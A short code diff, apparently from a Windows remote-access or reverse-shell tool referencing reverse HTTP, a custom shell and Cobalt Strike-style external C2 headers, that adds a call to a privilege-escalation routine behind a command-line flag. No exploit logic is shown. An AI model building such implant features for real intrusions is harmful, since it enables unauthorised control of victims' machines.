@@ -20,6 +20,7 @@
 #include "ReverseHttp.h"
 #include "CustomShell.h"
 #include "csExternalC2.h"
+#include "EasyPrivEsc.h"
 
 
 
@@ -104,7 +105,8 @@ int wmain(int argc, WCHAR* argv[]){
     //
     ////////////////////// Copy Wincat /////////////////////
 
-
+    if (listAgrument.CheckPriEsc)
+        EasyPrivEsc();
 
     if (listAgrument.Detached && argc > 3)
         RunProcessDetached(argc, argv);
